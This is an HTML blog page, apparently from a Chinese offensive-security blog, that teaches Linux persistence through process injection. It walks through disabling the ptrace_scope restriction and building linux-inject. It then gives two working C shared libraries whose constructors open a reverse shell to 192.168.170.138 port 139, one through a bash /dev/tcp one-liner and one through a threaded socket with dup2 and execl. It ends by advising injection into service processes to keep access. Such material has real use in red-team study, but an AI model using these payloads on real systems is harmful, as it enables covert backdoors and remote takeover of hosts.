@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Linux权限维持之进程注入</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="说明">说明</h2>
+<p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<code>CreateRemoteThread()</code>。在许多Linux发行版中，内核的默认配置文件<code>/proc/sys/kernel/yama/ptrace_scope</code>限制了一个进程除了<code>fork()</code>派生外，无法通过<code>ptrace()</code>来操作另外一个进程。</p>
+<p>要注入进程前，需要关闭这个限制（Root权限）：</p>
+<p><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/28f181718173d69326f3bfc58a3c0cbb.png" alt="2020-01-03-13-10-44"></p>
+<p>在Github上已经有了关于进程注入的实现代码：<code>https://github.com/gaffe23/linux-inject</code></p>
+<p>下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7b89dc61d7952191a608716bdcf951b8.png" alt="2020-01-03-13-10-54"></p>
+<p>确认编译是否正常：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8251535f3c0f9b55243940b6de2cf34b.png" alt="2020-01-03-13-11-04"></p>
+<p>获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
+接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
+{
+	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    system(<span style="color:#e6db74">&#34;bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
+   
+}
+
+
+__attribute__((constructor))
+<span style="color:#66d9ef">void</span> loadMsg()
+{
+   shell();
+}
+
+</code></pre></div><p>通过如下命令编译so文件：</p>
+<pre><code>clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c
+
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae110053d720c18b8c6bfb24a5483d4b.png" alt="2020-01-03-13-11-16"></p>
+<p>编译成so文件成功后的测试效果：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d23ecdf9310a3dce4fd8839d9d10e270.png" alt="2020-01-03-13-11-27"></p>
+<p>在Kali Linux这边获得了bash shell：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c2d15b84db450b39e55766b2097fd0c2.png" alt="2020-01-03-13-11-47"></p>
+<p>此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9e990f101b1f5bee215f4175926ac896.png" alt="2020-01-03-13-11-58"></p>
+<p>但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b920dfc70a90769b21214fd5d217dbbc.png" alt="2020-01-03-13-12-09"></p>
+<p>查看到IP与端口：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f6901fde3fc0693424326f3deeede92.png" alt="2020-01-03-13-12-19"></p>
+<p>再继续改进代码，采用socket套接字的方式来反弹shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netdb.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">hello</span>()
+{
+
+    <span style="color:#66d9ef">struct</span> sockaddr_in server;
+    <span style="color:#66d9ef">int</span> sock;
+    <span style="color:#66d9ef">char</span> shell[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>;
+    <span style="color:#66d9ef">if</span>((sock <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">return</span> NULL;
+    }
+
+    server.sin_family <span style="color:#f92672">=</span> AF_INET;
+    server.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">139</span>);
+    server.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
+    <span style="color:#66d9ef">if</span>(connect(sock, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">return</span> NULL;
+    }
+    dup2(sock, <span style="color:#ae81ff">0</span>);
+    dup2(sock, <span style="color:#ae81ff">1</span>);
+    dup2(sock, <span style="color:#ae81ff">2</span>);
+    execl(shell,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
+    close(sock);
+	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> NULL;
+}
+
+__attribute__((constructor))
+<span style="color:#66d9ef">void</span> loadMsg()
+{
+    pthread_t thread_id;
+    pthread_create(<span style="color:#f92672">&amp;</span>thread_id,NULL,hello,NULL);
+}
+
+
+</code></pre></div><p>执行效果：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fa4136ff8822c555b4008bce084f88a4.png" alt="2020-01-03-13-12-35"></p>
+<p>Kali Linux获得bash shell：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/003ee8252435ab25e2b012763fbf8d82.png" alt="2020-01-03-13-12-46"></p>
+<p>在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
